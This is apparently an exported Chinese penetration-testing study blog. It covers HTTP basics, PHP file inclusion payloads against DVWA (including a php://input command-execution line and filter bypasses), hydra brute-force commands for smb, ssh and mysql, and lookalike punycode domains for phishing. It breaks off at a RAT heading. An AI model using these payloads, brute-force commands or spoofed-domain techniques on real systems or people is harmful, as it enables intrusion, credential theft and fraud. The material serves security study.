<h2 id="1、cookie与session的区别"><a href="#1、cookie与session的区别" class="headerlink" title="1、cookie与session的区别"></a>1、cookie与session的区别</h2><p>1、cookie数据存放在客户的浏览器上，session数据放在服务器上。</p>
<p>2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗考虑到安全应当使用session。</p>
<p>3、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能考虑到减轻服务器性能方面，应当使用COOKIE。</p>
<p>4、单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</p>
<p>5、所以个人建议：将登陆信息等重要信息存放为SESSION</p>
<p>其他信息如果需要保留，可以放在COOKIE中</p>
<h2 id="2、用自己的语言描述get、post、Accept、Referer、User-Agent、host、cookie、X-Forwarded-for、Location各请求头的含义"><a href="#2、用自己的语言描述get、post、Accept、Referer、User-Agent、host、cookie、X-Forwarded-for、Location各请求头的含义" class="headerlink" title="2、用自己的语言描述get、post、Accept、Referer、User-Agent、host、cookie、X_Forwarded_for、Location各请求头的含义"></a>2、用自己的语言描述get、post、Accept、Referer、User-Agent、host、cookie、X_Forwarded_for、Location各请求头的含义</h2><p><strong>Connection</strong>表示持久的客户端与服务连接。（close关闭）</p>
<p>get：访问的地址，里面有=什么什么的是参数一般可以插入payllody，可以插入攻击代码如果没有一般没漏洞，HTTP版本1.1必须使用host请求头get发送的数据在url公开</p>
<p>post:一般为表单提交；通过post提交的数据在url不可见；</p>
<p>accept:表示浏览器支持的MIME类型，优先顺序是从左到右表示我当前的浏览器希望接受什么类型的文件，这是请求首部，当服务器没有客户端想要的资源的媒体类型时，会返回406 Not Acceptable 响应。当然使用了 <em>/</em> 表示愿意接受任意类型的资源，所以应不会看到这个响应。另外，这里的 q 表示权重，权重在 0-1 之间，（顺序为重大到小优先顺序）可以理解成客户端在这些给出的类型中，想优先接受什么类型，可以服务器就可以根据客户端的需要返回相应的资源。</p>
<p>如果没有，则默认为 1 。这里前面几个类型都没有标明，则默认都是 1 ，表示优先这些类型，后面的 0.9 表示前面都没有就用这个，最后的 0.8 表示如果都没有，那么任意的类型都行）</p>
<p>Referer：向服务器提交跳转链接所在地址，如果用户时通过链接跳转到当前页面，此请求域为链接所在界面的URL。</p>
<p>当访问某个网站是通过什么访问的，有时候一定要从某个地方访问挑战，我们便可以改为从设定的地方访问</p>
<p>Use-Agent:用来收集数据例如什么电脑，什么浏览器,MAC地址等等用来取证</p>
<p>Host:向服务器提交（服务器）主机和端口号</p>
<p>Cookie:第一次访问可能不带，第二次调用本地记录向客户端发送来验证身份</p>
<p>X_Forwarded_for：伪造ip登录，也可以伪造多IP登录例如127.0.$设置个字典$.$设置个字典$用于过waf绕后台抓包时添加</p>
<p><img src="//upload-images.jianshu.io/upload_images/21549033-03f08085be99b2ab.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/793/format/webp" alt="img"></p>
<p>Location: 这个消息头用于在重定向响应(那些状态码以3开头的响应)中说明重定向的目标。跳转</p>
<h2 id="3、常用-http-支持的方法有那些，同时对Head、options、put、get、post用自己的语言进行描述"><a href="#3、常用-http-支持的方法有那些，同时对Head、options、put、get、post用自己的语言进行描述" class="headerlink" title="3、常用 http 支持的方法有那些，同时对Head、options、put、get、post用自己的语言进行描述"></a>3、常用 http 支持的方法有那些，同时对Head、options、put、get、post用自己的语言进行描述</h2><p>HTTP请求的常用方法有：GET方法、POST方法、HEAD方法、PUT方法、DELETE方法、CONNECT方法、OPTIONS方法、TRACE方法。</p>
<p>Head:与get相似，检查资源是否存在。waf一般不拦截</p>
<p>Options:查看当前网站支持的请求方法。用来检测服务器性能</p>
<p>Put：把文件上传到服务器（后一个会覆盖上一个0，一般用来改资源）</p>
<p>get：从服务器获得数据返回前进不影响</p>
<p>post:向服务器传送数据后一个资源不会覆盖上一个返回前会一直向服务器发送请求（一般用增加资源）</p>
<p>TRACE.这种方法主要用于诊断。服务器应在响应主体中返回其收到的请求消息的具体内容。这种方法可用于检测客户端与服务器之间是否存在任何操纵请求的代理服务器。</p>
<h2 id="4、cookie头里面的secure与HttpOnly项分别代表什么含义"><a href="#4、cookie头里面的secure与HttpOnly项分别代表什么含义" class="headerlink" title="4、cookie头里面的secure与HttpOnly项分别代表什么含义"></a>4、cookie头里面的secure与HttpOnly项分别代表什么含义</h2><p>Secure：如果设置这个属性.则仅在HTTPS请求中提交cookie.</p>
<p>HttpOnly：如果设置这个属性，将无法通过客户端JavaScript直接访问cookie.</p>
<h2 id="5、状态码"><a href="#5、状态码" class="headerlink" title="5、状态码"></a>5、状态码</h2><p>每条HTTP响应消息都必须在第一行中包含一个状态码，说明请求的结果。根据代码的第一</p>
<p>位数字，可将状态码分为以下5类。</p>
<p>1xx</p>
<p>-提供信息。</p>
<p>2xx—请求被成功提交。</p>
<p>3xx—客户端被重定向到其他资源。</p>
<p>4xx-请求包含某种错误。</p>
<p>5xx—服务器执行请求时遇到错误。</p>
<p>还有大量特殊状态码，其中许多状态码仅用在特殊情况下。下面列出渗透测试员在攻击Web</p>
<p>应用程序时最有可能遇到的状态码及其相关的原因短语。</p>
<p>100Continue。当客户端提交一个包含主体的请求时.将发送这个响应。该响应表示已收到请求消息头.客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。</p>
<p>200Ok。本状态码表示已成功提交请求，且响应主体中包含请求结果。</p>
<p>201Created. PUT请求的响应返回这个状态码，表示请求已成功提交。</p>
<p>301Moved Permanently。本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。</p>
<p>302Found。本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL.</p>
<p>304Not Modified。本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与工f-None-Match消息头确定客户端是否拥有最新版本的资源。</p>
<p>400Bad Request。本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效的方式修改请求时(例如在URL中插人一个空格符)，可能会遇到这个状态码。</p>
<p>401Unauthorized.服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。</p>
<p>403Forbidden。本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。</p>
<p>404Not Found。本状态码表示所请求的资源并不存在。</p>
<p>]405Method Not Allowed。本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。</p>
<p>413Request Entity Too Large。如果在本地代码中探查缓冲器滋出瀚洞并就此提交超长数据串.则本状态码表示请求主体过长，服务器无法处理。</p>
<p>414Request URI Too Long。与前一个响应类似，本状态码表示请求中的URL过长，服务器无法处理。</p>
<p>500Internal Server Error。本状态码表示服务器在执行请求时遇到错误。当提交无法预料的输人、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。</p>
<p>503Service Unavailable。通常，本状态码表示尽管Web服务器运转正常.并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2020/04/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png"></p>
<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>使用include文件</p>
<p>代码表示上传的文件都以php执行</p>
<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.jpg" alt="img"></p>
<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.jpg" alt="img"></p>
<h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>需要把allow_url_include=on，magic_quotes_gpc=off</p>
<h2 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h2><p>      当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。            Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中</p>
<p>开启apache日志方法打开配置文件-httpd-conf，打开httpd.conf配置文件，</p>
<p>第299行：</p>
<p>\1.    ##CustomLog “logs/access.log” common</p>
<p>去掉前边的 # ，并<strong>重启apache</strong>。</p>
<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.PNG" alt="img"></p>
<p>写入一句话木马</p>
<h1 id="PHP包含写文件"><a href="#PHP包含写文件" class="headerlink" title="PHP包含写文件"></a>PHP包含写文件</h1><p>构造URL:</p>
<p><a href="http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input">http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input</a>,</p>
<p>并且提交post数据为:</p>
<?php system('net user');?>

<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.jpg" alt="img"></p>
<p>​     注意:只有在allow _url_include为on的时候才可以使用,如果想查看回显结果那必须在C:\php\php-5.2.14-Win32下找到php-apache2handler.ini打开，查找display_funtions=proc-open,oppen,exec,system…….删掉system重启apache。</p>
<h1 id="PHP包含读文件"><a href="#PHP包含读文件" class="headerlink" title="PHP包含读文件"></a>PHP包含读文件</h1><p><a href="http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php">http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php</a></p>
<p>访问URL,得到经过base64加密后的字符串:</p>
<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.jpg"></p>
<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/7.jpg"></p>
<h1 id="包含截断绕过"><a href="#包含截断绕过" class="headerlink" title="包含截断绕过"></a>包含截断绕过</h1><?php

​         if(isset($_GET['page'])){

​                  include$_GET['page'] .".php" ;

​         }else{

​                  include'home.php';

​         }

?>

<p>   这种方法只适合于magic_quotes_gpc=off的时候， php版本小于5.3.4，可通过%00截断绕过，不过现在已经很难见到了，比如：index.php?file=info.txt//////////////…………超过一定数据的/。</p>
<h1 id="str-replace、fnmatch涵数绕过"><a href="#str-replace、fnmatch涵数绕过" class="headerlink" title="str_replace、fnmatch涵数绕过"></a>str_replace、fnmatch涵数绕过</h1><h3 id="str-replace函数绕过"><a href="#str-replace函数绕过" class="headerlink" title="str_replace函数绕过:"></a>str_replace函数绕过:</h3><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。</p>
<p>例如page=ht<a href="http://tp//192.168.0.103/phpinfo.txt%E6%97%B6%EF%BC%8Cstr_replace%E5%87%BD%E6%95%B0%E4%BC%9A%E5%B0%86http://%E5%88%A0%E9%99%A4%EF%BC%8C%E4%BA%8E%E6%98%AFpage=http://192.168.0.103/phpinfo.txt%EF%BC%8C%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E3%80%82">http://tp://192.168.0.103/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.0.103/phpinfo.txt，成功执行远程命令。</a></p>
<p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
<p>1、本地文件包含</p>
<p> <a href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=..././777.jpg">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=…/./777.jpg</a></p>
<p>2、绝对路径不受任何影响<a href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=c:/2.txt">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=c:/2.txt</a></p>
<p>3、远程文件包含:<a href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=htthttp://p://192.168.0.106:8080/index.php">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=htthttp://p://192.168.0.106:8080/index.php</a></p>
<h3 id="fnmatch函数绕过"><a href="#fnmatch函数绕过" class="headerlink" title="fnmatch函数绕过"></a>fnmatch函数绕过</h3><p>if(!fnmatch(“file*”,$file)&amp;&amp;$file!=”include.php”),当文件既不是”include.php”也不是”file*”（文件名file开头）时才抛出错误，反之意思，如果文件名符合其中一个条件既可以。page=file:///C:/xampp/htdocs/dvwa/php.ini 刚好满足”file*”（文件名file开头）。</p>
<p> <a href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=file:///C:/2.txt">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=file:///C:/2.txt</a></p>
<h2 id="php内置协议"><a href="#php内置协议" class="headerlink" title="php内置协议"></a>php内置协议</h2><table>
<thead>
<tr>
<th>File://</th>
<th>访问本地文件系统</th>
</tr>
</thead>
<tbody><tr>
<td>htt[p://</td>
<td>访问HTTP(s)网址</td>
</tr>
<tr>
<td>ftp://</td>
<td>访问FTP(s)URLS</td>
</tr>
<tr>
<td>php://</td>
<td>访问各个输入/输出流(I/o streams)</td>
</tr>
<tr>
<td>zlib://</td>
<td>压缩流</td>
</tr>
<tr>
<td>data://</td>
<td>数据(RFC2397)</td>
</tr>
<tr>
<td>ssh2://</td>
<td>Secure Shell 2</td>
</tr>
<tr>
<td>expect://</td>
<td>处理交互式的流</td>
</tr>
<tr>
<td>glob://</td>
<td>查找匹配的文件路径模式</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>旁注、目录越权、跨库、CDN绕过</title>
    <url>/2020/07/23/%E6%97%81%E6%B3%A8%E3%80%81%E7%9B%AE%E5%BD%95%E8%B6%8A%E6%9D%83%E3%80%81%E8%B7%A8%E5%BA%93%E3%80%81CDN%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%97%81%E6%B3%A8%E3%80%81%E7%9B%AE%E5%BD%95%E8%B6%8A%E6%9D%83%E3%80%81%E8%B7%A8%E5%BA%93%E3%80%81CDN%E7%BB%95%E8%BF%87.png"></p>
<h2 id="旁注原理"><a href="#旁注原理" class="headerlink" title="旁注原理"></a>旁注原理</h2><p>主站不存在漏洞，通过同服务器的其它站点存在的漏洞，进而获取整个服务器网站的权限，进行控制。</p>
<h2 id="ip逆向查询"><a href="#ip逆向查询" class="headerlink" title="ip逆向查询"></a>ip逆向查询</h2><p><strong>可通过ping 域名获取其相关IP地址，之后通过IP地址反查获取其旁注的域名。</strong></p>
<p><strong>相关网址：</strong></p>
<blockquote>
<p><a href="http://tool.chinaz.com/Same/">http://tool.chinaz.com/Same/</a></p>
<p><a href="http://dns.aizhan.com/">http://dns.aizhan.com/</a></p>
<p><a href="http://www.11best.com/ip/">http://www.11best.com/ip/</a></p>
</blockquote>
<h2 id="目录越权："><a href="#目录越权：" class="headerlink" title="目录越权："></a><strong>目录越权：</strong></h2><p><strong>通过一个网站的目录访问统一服务器下的其他网站的目录，一个网站被攻陷，全都被攻陷</strong></p>
<p>防御方法：每个网站创建一个不同的账号</p>
<p><strong>1、建立一个账号test，默认在 users 组</strong></p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/1.PNG"></p>
<p><strong>2、将网站的身份验证和访问控制的匿名访问更换为test</strong></p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/2.PNG"></p>
<p><strong>3、将IUSR删除，添加test用户，需要注意的是，尽量不要同时给读取运行和写入权限，读写分离。</strong></p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/3.PNG"></p>
<p><strong>4、如果要绝对的安全，可以将C盘的访问权限设置为仅管理员访问</strong></p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/4.PNG"></p>
<h2 id="跨库查询："><a href="#跨库查询：" class="headerlink" title="跨库查询："></a>跨库查询：</h2><p><strong>是指由于权限设置不严格，导致普通帐号被授予过高的权限，从而使得其可以对其他的数据库进行操作。比如，在mysql**</strong>中，informatin_schema**</p>
<p><strong>这个表默认只有root**</strong>有权限进行操作。但是如果一个普通账户权限过高后，他便可以对该数据库进行操作，从而影响整个mysql**<strong>数据库的运行。</strong></p>
<p>sqlmap里面使用“—current-代表”进行判断当前库是哪个。Mysql的root、mssql的sa、oracle的sys 分别是其数据库中权限最大的账户。</p>
<h2 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h2><p>**1.**利用SecurityTrails平台</p>
<p><strong>2.</strong> 二级域名或泛解析ping</p>
<p>**3.**nslookup</p>
<p>**4.**<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> ###DNS查询</p>
<p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> ###微步在线<a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a> ###在线域名信息查询<a href="http://viewdns.info/">http://viewdns.info/</a> ###DNS、IP等查询</p>
<p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> ###CDN查询IP</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>暴力破解</title>
    <url>/2020/09/12/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h1><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.png"></p>
<h1 id="一个网站登录的地方有那些漏洞，用自己的语言做一个总结。"><a href="#一个网站登录的地方有那些漏洞，用自己的语言做一个总结。" class="headerlink" title="一个网站登录的地方有那些漏洞，用自己的语言做一个总结。"></a>一个网站登录的地方有那些漏洞，用自己的语言做一个总结。</h1><p>1、 用户是否设置了复杂的密码</p>
<p>2、网站是否存在验证码</p>
<p>3、 网站尝试登录的行为是否有限制</p>
<p>4、 网站是否双因素认证（一般在管理后台登陆使用）</p>
<p>5、 网站是否设置了Token值</p>
<p>6、提示用户名错误或者提示密码错误会泄露信息（真确的应该为提示用户名或密码错误）</p>
<p>7、注册账号时可以批量注册账号</p>
<p>8、 修改密码时不需要提供旧密码</p>
<p>9、注册用户时不存在唯一性可以注册多个同名账号</p>
<p>10、 密码未加密明文传输</p>
<p>11、  源代码框架存在密码</p>
<p><strong>C/S与B/S的结构区别：</strong> </p>
<p>硬件环境不同，C/S通常是建立在专用的网络上，小范围的网络环境。而B/S是建立在广域网上的，适应范围强，通常有操作系统和浏览器就行； </p>
<p>安全要求不同，C/S结构比B/S结构更安全，因为用户群相对固定，对信息的保护更强；而B/S结构面向的范围广，所以安全性比较低； </p>
<p>系统维护不同，B/S结构维护升级比较简单，而C/S结构维护升级相对困难。</p>
<h1 id="（b-s）（浏览器-客户端）验证码暴力破解（on-client、on-server、Token）实验"><a href="#（b-s）（浏览器-客户端）验证码暴力破解（on-client、on-server、Token）实验" class="headerlink" title="（b/s）（浏览器/客户端）验证码暴力破解（on client、on server、Token）实验"></a>（b/s）（浏览器/客户端）验证码暴力破解（on client、on server、Token）实验</h1><p>on server:我们可以看见当我们输入错误的验证码时验证码输入错误</p>
<p>on server常见问题：验证码在后台不过期，导致长期使用(php默认session是24分钟过期)；验证码校验不严格，逻辑出现问题；验证码设计的太过简单和有规律的被猜解</p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.jpg"></p>
<p>当我们正确的时候提示我们账号或密码错误所以我们可以去爆破验证码并没有被替换</p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.jpg"></p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.jpg"></p>
<p>on client：常见问题：不安全的前端js实现验证码；不安全的将验证码在cookie中泄露；不安全的将验证码在前端源代码中泄露</p>
<p>我们可以看到我们抓包输入错误的验证码并没有提示验证码错误而提示用户名或密码错误因为这是客户端验证只是欺骗前端我们可以直接把验证码去掉进行爆破</p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.jpg"></p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.jpg"></p>
<p>Token：由于token值输出在前端源代码中，容易被获取，因此也就失去了防暴力破解的意义，一般Token在防止CSRF上会有比较好的功郊。</p>
<p>我们使用音叉攻击注意：线程数设为1；Grep-Extract设置好开始token”value=”  结束为”</p>
<p>/&gt; ；有郊载荷设为递归搜索</p>
<p>“token” value=”</p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.jpg"></p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.jpg"></p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.jpg"></p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.jpg"></p>
<h1 id="验证码识别实验"><a href="#验证码识别实验" class="headerlink" title="验证码识别实验"></a>验证码识别实验</h1><p>因为我们的使用工具还不能抓包所以</p>
<p>1.Burp抓包，然后复制URL、数据包到Pkav。</p>
<p>\2. 设置密码标记、验证码标记、配置、加载外部字典、配置验证码、发包。</p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.jpg"></p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/11.jpg"></p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/13.jpg"></p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/20.jpg"></p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/14.jpg"></p>
<h1 id="Bruter、hydra对smb、ssh、mysql等进行密码暴破"><a href="#Bruter、hydra对smb、ssh、mysql等进行密码暴破" class="headerlink" title="Bruter、hydra对smb、ssh、mysql等进行密码暴破"></a>Bruter、hydra对smb、ssh、mysql等进行密码暴破</h1><p>Bruter(使用字典时不能有中文目录)</p>
<p>Bruter对mysql破解</p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/15.jpg"></p>
<p>Bruter对mysql破解：（mysql不能使用ip地址连接）所以我这里用本地连接</p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/16.jpg"></p>
<p>Bruter对ssh破解</p>
<p><img src="/image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/17.jpg"></p>
<h1 id="hydra对smb、ssh、mysql破解"><a href="#hydra对smb、ssh、mysql破解" class="headerlink" title="hydra对smb、ssh、mysql破解"></a>hydra对smb、ssh、mysql破解</h1><h2 id="对smb破解："><a href="#对smb破解：" class="headerlink" title="对smb破解："></a>对smb破解：</h2><p># hydra -l administrator -P top100.txt 192.168.0.102 smb</p>
<h3 id="对ssh破解1-破解ssh："><a href="#对ssh破解1-破解ssh：" class="headerlink" title="对ssh破解1.破解ssh："></a>对ssh破解1.破解ssh：</h3><p># hydra -l 用户名 -p 密码字典 -t 线程-vV -e ns ip ssh</p>
<p># hydra -l 用户名 -p 密码字典 -t 线程-o save.log -vV ip ssh</p>
<p>root@kali:~# hydra -L user.txt -P top100.txt -t 1 -vV -e ns</p>
<p>-o save.log 192.168.0.109 ssh</p>
<h3 id="对mysql破解"><a href="#对mysql破解" class="headerlink" title="对mysql破解"></a>对mysql破解</h3><p>root@kali:~# hydra -L user.txt -P</p>
<p>top100.txt -t 2 -vV -e ns -o save.log 192.168.0.113 mysql</p>
<h1 id="暴力破解及验证码安全防范"><a href="#暴力破解及验证码安全防范" class="headerlink" title="暴力破解及验证码安全防范"></a>暴力破解及验证码安全防范</h1><p>\1. 密码长度8位及以上。</p>
<ol start="2">
<li><p>不允许以自己的手机号码、QQ、邮箱等关键“特征”为密码。</p>
</li>
<li><p>用户名与密码不能有任何联系，如用户名为“admin”，密码为“admin888”。</p>
</li>
</ol>
<p>\4. 密码密码复杂度要求：字符、大小写、数字等。</p>
<p>\5. 设置验证码过期时间、使用了马上失效等，加大验证码复杂度：颜色干扰、符号干扰等。</p>
<p>有时间的同学看一下<a href="http://drops.leesec.com/#!/drops/525.%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB">http://drops.leesec.com/#!/drops/525.%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB</a></p>
<p>看一下验证码总结文章，可以结合这个站<a href="http://wooyun.2xss.cc/">http://wooyun.2xss.cc/</a>  查看攻击过程</p>
]]></content>
  </entry>
  <entry>
    <title>社工、APT</title>
    <url>/2020/02/24/%E7%A4%BE%E5%B7%A5%E3%80%81APT/</url>
    <content><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E7%A4%BE%E5%B7%A5%E3%80%81APT.png"></p>
<h2 id="伪造邮件发送试验"><a href="#伪造邮件发送试验" class="headerlink" title="伪造邮件发送试验"></a>伪造邮件发送试验</h2><p>要想查看一个域名是否配置了SPF，可以用nslookup或者dig查看：</p>
<p>nslookup</p>
<p>-type=txt ***.com.cn</p>
<p>dig -t txt 163.com</p>
<p>未配置的是这样：</p>
<p><img src="/image/apt/1.jpg"></p>
<p>配置了的是这样</p>
<p><img src="/image/apt/2.jpg"></p>
<p>SPF可以配置为ip，也可以配置为域名</p>
<p><img src="/image/apt/3.jpg"></p>
<h2 id="钓鱼域名试验"><a href="#钓鱼域名试验" class="headerlink" title="钓鱼域名试验"></a>钓鱼域名试验</h2><p>有了文案，怎么能让邮件看起来真实性更高呢？最简单的就是用超链接,把元素内容改成想要仿冒的域名，在邮箱页面上，就会直接显示元素的内容，我们可以使用一些与目标相似的域名。比如用0代替o，用1代替l，用vv代替w等等，这就需要发挥你的想象来寻找相似的域名：</p>
<p><a href="http://www.taoba0.com/">http://www.taoba0.com/</a></p>
<p><a href="http://www.a1iyun.com/">http://www.a1iyun.com</a></p>
<p>如果找不到这样形似的域名或者这种域名比较贵的情况下，可以尝试一些更骚的操作。。例如使用国际域名这样的域名是怎么注册的呢？在了解怎么注册一个这样的域名前，需要先了解什么是国际域名（Internationalized domain name, IDN）。</p>
<p><strong>IDN：</strong></p>
<p>是指在域名中包含至少一个特殊语言字母的域名，特殊语言包括中文、法文、拉丁文等。在DNS系统工作中，这种域名会被编码成ASCII字符串，并通过Punycode进行翻译。</p>
<p>Punycode是一个根据RFC 3492标准而制定的编码系统,主要用于把域名从地方语言所采用的Unicode编码转换成为可用於DNS系统的编码。</p>
<p>目前，因为操作系统的核心都是英文组成，DNS服务器的解析也是由英文代码交换，所以DNS服务器上并不支持直接的中文域名解析，所有中文域名的解析都需要转成punycode码，然后由DNS解析punycode码。其实目前所说的各种主流浏览器都完美支持IDN域名，浏览器里面会自动对IDN域名进行Punycode转码，而地址栏依旧显示的是原始输入的IDN域名。</p>
<p>所以，要想注册“币安”的这个域名：</p>
<p><a href="http://www.biṇaṇce.com/">www.biṇaṇce.com</a></p>
<p>其实只需要注册他经过punycode转码后的域名：</p>
<p><a href="http://www.biṇaṇce.com/">www.xn--biace-4l1bb.com</a></p>
<p>然后让目标访问<a href="http://www.biṇaṇce.com，在地址栏中就很难被发现。[punycode在线转换工具：http://tools.jb51.net/punycode/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Ftools.jb51.net%2Fpunycode%2Findex.php)">www.biṇaṇce.com，在地址栏中就很难被发现。[punycode在线转换工具：http://tools.jb51.net/punycode/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Ftools.jb51.net%2Fpunycode%2Findex.php)</a></p>
<p><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/csguo/p/7401874.html">UniCode编码表</a><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/csguo/p/7401874.html">https://www.cnblogs.com/csguo/p/7401874.html</a></p>
<p>这样我们便可以伪造域名钓鱼</p>
<p><img src="/image/apt/4.jpg"></p>
<p>然后将IDN域名以超链接写入邮件</p>
<p><img src="/image/apt/5.jpg"></p>
<p><strong>https**</strong>证书**</p>
<p>最后要说一点，就是https证书，前边仿冒的再像，但如果浏览器上直接出现了不安全警告或者红斜杠，也很容易引起目标的警惕。所以在条件允许的情况下，尽量做戏做全套，现在普通的https证书也是很便宜的。证书的具体申请使用就不在这细说了，百度一下，全都知道。</p>
<h2 id="完成伪造扩展名试验"><a href="#完成伪造扩展名试验" class="headerlink" title="完成伪造扩展名试验"></a>完成伪造扩展名试验</h2><p>使用KilerRat工具：</p>
